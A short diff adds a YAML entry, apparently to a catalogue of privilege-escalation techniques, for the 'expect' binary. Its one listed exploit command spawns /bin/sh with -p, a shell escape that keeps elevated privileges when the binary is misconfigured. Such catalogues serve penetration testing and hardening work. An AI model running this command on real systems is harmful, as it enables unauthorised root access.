@@ -1,0 +1,4 @@
+name: expect
+binary_path: /usr/bin/expect
+exploit_cmds:
+- /usr/bin/expect -c 'spawn /bin/sh -p;interact'
